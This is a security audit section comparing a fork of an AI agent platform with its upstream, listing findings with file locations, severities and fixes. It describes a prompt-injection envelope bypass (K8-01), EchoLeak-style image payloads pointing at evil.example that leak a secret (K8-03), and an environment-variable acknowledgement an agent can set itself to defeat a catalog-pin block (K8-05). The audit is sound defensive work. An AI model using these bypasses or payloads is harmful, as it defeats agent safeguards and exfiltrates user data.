# §5 — FORK AUDIT (openclaw/openclaw vs ~/Sites/openclaw)

**Topology (measured):** `origin=markfietje/openclaw`, `upstream=github.com/openclaw/openclaw`,
`fork-fork=markfietje/openclaw-fork`. Merge-base `f0ab2a27b2`. `rev-list --left-right --count
upstream/main...HEAD` = **0 behind / 90 ahead**. HEAD `1d2d29b22` (2026-09-25). Fork package
version 2026.9.6. `diff upstream/main...HEAD --stat` = **109 files, +12503 / −246**.

> The brief said 76 ahead at `8634b4fca89`. Measured: **90 ahead at `1d2d29b22`.** The
> rebase-survival table below is measured against this fork.

---

## K8-01 — HIGH — The GhostJacking envelope can be switched off with one line of attacker content

`src/agents/tools/tool-results.ts:19-24` (read verbatim at this fork HEAD):

```ts
export function wrapUntrustedToolText(text: string, source: "unknown" = "unknown"): string {
  if (text.includes("EXTERNAL_UNTRUSTED_CONTENT")) {
    return text;              // ← returns UNWRAPPED
  }
  return wrapExternalContent(text, { source, includeWarning: false });
}
```

The double-wrap guard is a **bare substring test on fully attacker-controlled content.** Call
sites are the four untrusted-output seams: `src/agents/agent-tools.read.ts:1151`,
`src/agents/bash-tools/exec-output.ts:23`, `src/agents/tools/transcripts-tool-read.ts:74,127`.

**Exploit:** drop a line containing `EXTERNAL_UNTRUSTED_CONTENT` into any file the agent reads,
any command it runs, or any transcript it lists — the envelope is silently absent. Worse, the
attacker can emit a **well-formed forged envelope** (the id must be `[0-9a-f]{16}` to satisfy
`tool-loop-detection.ts:81`), so the model sees attacker-authored untrusted-content framing.

**The asymmetry that names the fix:** `web-search-output.ts:114-115` strips forged envelopes
with an **anchored regex** before its own wrap; `tool-results.ts` has no such strip. Copy that shape.

**Fix:** replace the `includes` test with the anchored-regex strip already proven one file over.
Minimal diff, and it removes a bypass rather than adding a check.

---

## K8-02 — HIGH — The link-reader surface bypasses `remoteImageHosts` completely

`ui/src/components/link-reader-content.ts` — **upstream-owned, zero fork diff**
(`git diff upstream/main...HEAD -- ui/src/components/link-reader-content.ts` → empty), and
therefore entirely outside the fork's allowlist hardening.

It builds its own parser options at `:21` and its own image loader: `:111 prepareImage()` builds
a real `<img crossOrigin="anonymous">`; `:158 void loadImage(url.href)`. Its only gate
(`:123-129`) is `https:` + cross-origin + not `.local` + not a canonical IP. **No
`remoteImageHosts` check anywhere.**

**Consequence:** while the chat markdown surface now refuses any un-allowlisted host, opening a
link in the link-reader panel auto-fetches an attacker-chosen HTTPS host and leaks the reader's
IP + gateway session to it. The fork's `markdown-image-gate.ts` is a single-decision-point claim
that is true only for `createMarkdownParser()` consumers.

**Fix:** route the link-reader's image path through `markdown-image-gate.ts`, or gate the panel
behind `remoteImageHosts`.

---

## K8-03 — MEDIUM-HIGH — The markdown-image strip regex misses reference-style and raw-HTML images

`src/security/external-content.ts:349`:

```ts
const imagesStripped = tagStripped.replace(/![\t ]*\[[^\]]*\]\([^\)]*\)/g, "[Image omitted]");
```

| input | result |
|---|---|
| `![x][r]` + `[r]: https://evil.example/a.png` | **SURVIVES** |
| `<img src="https://evil.example/a.png?k=SECRET">` | **SURVIVES** |
| `![x](https://evil.example/a(1).png)` | partial: `[Image omitted].png)` |
| `![x](… "t")`, `![x](<…>)`, `![](…)` | stripped |

The commit message calls this *"closes EchoLeak envelope gap"* — but the HTML `<img>` form **is**
the canonical EchoLeak vector and is not covered. The file's own comment claims "image blocks
still flow," which is exactly the gap.

---

## K8-04 — MEDIUM-HIGH — All three gateway pre-handshake toggles default OFF: 436 lines of new security code are inert by default

`src/gateway/server/verify-client.ts:114,153,202` — each check is gated on `security.X === true`.
The zod schema (`src/config/zod-schema.gateway.ts:364-369`) makes all three `z.boolean().optional()`.
Only check #5 (origin + allowlist) runs unconditionally — and that duplicates the post-handshake gate.

`verify-client.ts:55` states the design as *"additive and safe for existing deployments …
existing proxy deployments see zero new rejections"* (`:112-113`). **That is the right
compatibility choice**, and I am not calling it a bug. The honest consequence is that a
**default fork install gets none of the new header/proxy/CSRF hardening**, and the only
compensating control is a Doctor *note* (`src/flows/doctor-health-contributions.ts:116-139`),
which is advisory.

**Fix (choose one, do not drift):** either enable the toggles by default on non-loopback binds
(a breaking change, correctly signalled), or record the default-off posture as a **declared
non-claim** — which is this repo's own idiom — rather than leaving it to a Doctor note.

---

## K8-05 — MEDIUM — `BRAIN_MCP_PINS_ACK=1` is an env ack path an agent can set itself

`src/agents/agent-bundle-mcp-catalog-pins.ts:426-452`. The one-shot-per-process guard resets on
every new process, so an agent with shell access can `BRAIN_MCP_PINS_ACK=1 openclaw …` repeatedly
and re-acknowledge a rug-pulled catalog, defeating the hard-block at
`agent-bundle-mcp-materialize.ts:474-490`. The commit log shows this was itself an audit fix
(`45286bcf7b8 fix(security): production catalog-pin ack path`) — **it moved the hole rather
than closing it.**

## K8-06 — MEDIUM — Catalog pins silently no-op when `agentDir` is not threaded

`agent-bundle-mcp-catalog-pins.ts:410-422`: `reconcileCatalogPins` returns an empty map when
neither `pinsPath` nor `agentDir` is supplied. The fail-closed anchor throws only when the
derived pins file *exists*. So **`agentDir` missing and no pins file = zero enforcement, no log,
no error.** Every call site threads it conditionally — `agent-bundle-mcp-harness.ts:300-303`,
`agent-bundle-mcp-materialize.ts:692-693`, both `...(params.agentDir ? {...} : {})`.

---

## K8-07 — MEDIUM — Four-way typebox drift; `--frozen-lockfile` cannot pass

| source | value |
|---|---|
| `extensions/brain-server/package.json:9` (manifest) | `1.3.27` |
| `pnpm-lock.yaml` importer **at HEAD** (committed) | `1.3.30` |
| `pnpm-lock.yaml` **working tree** (`git status` → `M`) | `1.3.33` |
| root catalog `pnpm-lock.yaml:203` + `package.json:2313` | `1.3.33` |
| `brain-server/plugin/package.json:9` (canonical) | `1.3.26` |

Fork commit `3bc031bb932` claims *"--frozen-lockfile now passes."* **It does not** — the manifest
specifier (`1.3.27`) does not match the lockfile importer specifier (`1.3.30` at HEAD). This is
the **same drift class** that commit was written to fix, and the documented history (1.3.15 vs
1.3.18) has recurred at 1.3.27/1.3.30/1.3.33.

## K8-08 — MEDIUM — `fly.toml` is an unauthenticated public deployment template

`fly.toml:18`: `app = "node dist/index.js gateway --allow-unconfigured --port 3000 --bind lan"`
with `[http_service] force_https = true` (`:22`) and `min_machines_running = 1`.
`--allow-unconfigured` means auth is **not required**. Upstream-owned (no fork diff) — flagged
because the fork inherits it verbatim and it is the deployment path a fork user most likely copies.

## K8-09 — MEDIUM — `docker-compose.yml` posture

`:68-71` publishes 18789/18790/3978 on all interfaces; `:24`
`OPENCLAW_GATEWAY_TOKEN: ${OPENCLAW_GATEWAY_TOKEN:-}` defaults **empty**; `:80`
`--bind ${OPENCLAW_GATEWAY_BIND:-lan}`. Host secrets bind-mounted in: `:49` mounts
`~/.openclaw-auth-profile-secrets`, `:42-44` pass `CLAUDE_AI_SESSION_KEY` / `CLAUDE_WEB_SESSION_KEY` /
`CLAUDE_WEB_COOKIE` from `.env`.

**Positives, stated for fairness:** `cap_drop: [NET_RAW, NET_ADMIN]` (`:61-63`),
`no-new-privileges: true` (`:64-65`), docker.sock line **commented out** (`:55`), no
`privileged: true`. Net: acceptable hardening, weak default bind posture. No fork diff.

---

## K8-10 — LOW — Approval args truncate at 2000 chars, so the reviewer still approves unseen bytes

`src/infra/plugin-approvals.ts:100` `PLUGIN_APPROVAL_ARGS_MAX_LENGTH = 2_000`. The module's own
rationale (`:105-108`) is that silent elision is *"the laundering shape this cap exists to close"*
— the marker discloses the count, but a >2000-char tool call is still approved on a partial view.
Correctly labelled display-only (`agent-tools.before-tool-call.approval.ts:96`); both surfaces
wired (`:255` embedded broker, `:337` gateway).

## K8-11 — LOW — The Node-runtime update path is checksum-only, NOT signature-verified

`scripts/install-cli.sh:1254-1264` fetches `SHASUMS256.txt` and the tarball from the same origin
and compares SHA-256. `grep -c "gpg\|cosign\|minisign\|pgp" scripts/install-cli.sh` → **0**.
Integrity rests on nodejs.org's TLS, not on a key. Invoked from `node-runtime-update.mjs:89-119`.

## K8-12 — LOW — `isRemoteImageHostAllowlisted` accepts `http:`

`ui/src/components/markdown-image-gate.ts:40` permits both schemes; an allowlisted host is then
fetched over plaintext.

## K8-13 — LOW — `verify-client.ts` documents a symbol that does not exist

`:60` and `:166` both cite `hasCopilotExtensionOrigin` as the post-handshake counterpart.
`grep -rn hasCopilotExtensionOrigin src/` matches **only those two comments.** The real code is
`normalizeChromeExtensionOrigin` (`src/gateway/server/ws-origin-policy.ts:22`), additionally
gated on `isBrowserCopilotClient(...)`. Net severity low (equivalent to the already-allowed
no-Origin case at `:169`), but the stated invariant "both gates stay in sync" is not literally
true and the comment misleads the next reader.

## K8-14 — INFO — Fork ships plugin 0.6.10 vs canonical 0.6.11 — no security-relevant drift

`index.ts` **byte-identical** (`sha256 e3c89b5dc7601ceeb65e2250ebc5ccb07116e529ea2b7eb5b79897dcf4c43856`
both). Deltas confined to the 0.6.11 diagnostic release: `src/procedural.ts` (fork lacks the
`MemoryProcedureStep` type), `tsconfig.json`, one fixture comment, two test files, plus
`ambient.d.ts` ×3 and two `.contract.spec.ts` files that exist only canonically. The one
material divergence is typebox (1.3.27 vs 1.3.26 — K8-07).

## K8-15 — INFO — A fork-built macOS app consumes **upstream's** signed update feed

`appcast.xml:2883` → `https://raw.githubusercontent.com/openclaw/openclaw/main/appcast.xml`.
No fork diff. Fork-built desktop binaries therefore auto-update to **upstream releases,
silently discarding the fork's 90 commits.**

---

## 5.1 Hardening × wiring × bypassable × has-failing-test

| Hardening | Wired on all paths? | Bypassable? | Test that fails on deletion |
|---|---|---|---|
| **Context-hygiene merge seam** | **Yes** — `hooks.ts:448 mergeBeforePromptBuild` + `:520 mergeAgentTurnPrepare`; consumed by both runners (embedded `attempt-prompt-helpers.ts:152`, CLI `cli-runner/prepare.ts:1867-1904`) | Not found. Caveat: the sanitized field set is a **hardcoded literal** — any new model-visible hook field upstream adds is unsanitized | `hooks.prompt-build-hygiene.test.ts:32-107` (9 tests) + `hooks.turn-prepare-hygiene.test.ts:29-86` (5 tests) |
| **MCP catalog pins** | **Yes**, one funnel (`agent-bundle-mcp-materialize.ts:465`); all 5 callers route through it | **YES** — K8-05, K8-06 | `agent-bundle-mcp-catalog-pins.test.ts` (324 ln), `agent-bundle-mcp-harness.pins.test.ts` (197 ln) |
| **Approval args** | **Yes**, both surfaces (`:255` embedded, `:337` gateway) | Partially — 2000-char cap (K8-10) | `agent-tools.before-tool-call.approval.args.test.ts` (176 ln), `bash-tools.exec-approval-output.test.ts` |
| **Truncation (head+tail)** | **Yes** — `truncateToolResultText` is the single entry | No bypass found | `tool-result-truncation.test.ts` (+133 ln) |
| **Remote-image allowlist** | **PARTIAL** — wired at `markdown-parser.ts:623,733`, `markdown-render-options.ts:69`, `plugin-icon-http.ts:405-409` | **YES** — K8-02 (second render path), K8-12 (http) | `markdown-image-gate.test.ts`, `e2e/remote-images.e2e.test.ts`, `e2e/favicon-allowlist.e2e.test.ts` |
| **Multi-line token refusal** | Extension-side only (`config.ts:163`) | N/A | `config.test.ts:120` |
| **Forwarded-headers** (+221 NEW) | **Yes**, one server (`server-runtime-state.ts:304`) | **Yes** — all three checks default off (K8-04) | `server/verify-client.test.ts` (12 tests) |
| **verify-client** (+215 NEW) | **Yes** on the single gateway WS server; the two desktop sockets are ticket-gated and upstream-owned | K8-13 (origin skip) | `verify-client.test.ts`, `server.auth.browser-hardening.test.ts:490` |

## 5.2 Supply-chain verdict — auto-update signature: **SPLIT**

| Path | Signature-verified? | Evidence |
|---|---|---|
| **macOS desktop app update** | **YES** | All 3 enclosures carry `sparkle:edSignature` (base64 Ed25519): `appcast.xml:2883,7215,8475`. Sparkle verifies EdDSA against the key in `Info.plist` — fail-closed. |
| **Node runtime update** | **NO** | `install-cli.sh:1254-1264` — HTTPS fetch + SHA-256 compare; `grep -c "gpg\|cosign\|minisign\|pgp"` → **0**. Integrity rests on TLS, not a key. |
| **Appcast authenticity** | **NO (fork consequence)** | Feed URL is upstream-controlled. No fork diff. |

**So: update delivery IS signature-verified for the app binary; the runtime bootstrap is NOT.**
Neither mechanism is fork-modified — `git diff upstream/main...HEAD -- appcast.xml
node-runtime-update.mjs docker-compose.yml fly.toml` is empty (only `pnpm-lock.yaml` changed).

**Also cleared:** `__openclaw_vitest__/` exists on disk but is **0 files git-tracked** and
gitignored (`.gitignore:14`) — **not a finding.** `dist/` likewise. npm publication is gated
upstream (`plugin-publication-artifact.mjs:651,669,697`; `npm-placeholder-publication.mjs:247`
requires `build.bundledDist === false`).

---

## 5.3 REBASE-SURVIVAL TABLE — the fork's existential risk

Upstream commit counts on the touched file since 2026-08-01:

| Fork hardening file | Upstream commits | Conflict risk | Silent-regression risk |
|---|---|---|---|
| `src/gateway/forwarded-headers.ts` | **0** | None (new file) | Low |
| `src/gateway/server/verify-client.ts` | **0** | None (new file) | **Med** — a new upstream WS server won't inherit `verifyClient` |
| `src/plugins/context-hygiene.ts` | **0** | None (new file) | **Med** — sanitized field set is a hardcoded literal in `hooks.ts` |
| `ui/src/components/markdown-image-gate.ts` | **0** | None (new file) | **HIGH** — a second render path already exists (K8-02) |
| `src/agents/agent-bundle-mcp-catalog-pins.ts` | **0** | None (new file) | Med |
| **`src/plugins/hooks.ts`** | **24** | **HIGH** | **HIGH** — the `as TResult` cast in `mergeAgentTurnPrepare` **drops any field upstream adds**, and compiles clean |
| `…/embedded-agent-runner/tool-result-truncation.ts` | **21** | **HIGH** | Med — an upstream rewrite of the tail heuristic silently reverts the accounting |
| `src/gateway/plugin-icon-http.ts` | **16** | **HIGH** | High — a guard rewrite drops the `remoteImageHosts` clause |
| `src/infra/plugin-approvals.ts` | 8 | MED | Med |
| `src/agents/agent-tools.before-tool-call.approval.ts` | 8 | MED | Med |
| `src/config/types.gateway.ts`, `zod-schema.gateway.ts` | active refactor (`72e85dff0fe`, `c05344453c3`, `e7ebacf626d`) | **HIGH** | Med |
| `src/security/external-content.ts`, `agents/mcp-content.ts` | 6 each | MED | Med |
| `src/auto-reply/reply/strip-inbound-meta.ts` | 5 | MED | Low |
| **`src/agents/tools/tool-results.ts`** | **1** | LOW | **This is where the fragility lives** — K8-01's broken guard sits in the file upstream touches *least*, so it will persist silently for a long time |
| `src/gateway/server-runtime-state.ts` (+5) | — | LOW-MED | Med |

**Read:** the fork's "keep additions at the end of the type" convention (visible in
`types.gateway.ts`, `plugin-approvals.ts`, `markdown-render-options.ts`, `external-content.ts`)
is genuinely good and is doing its job on the type-only files. **It does nothing for the logic
files**, which is where the 24/21/16-commit files live. The four HIGH silent-regression rows are
all in that category.

---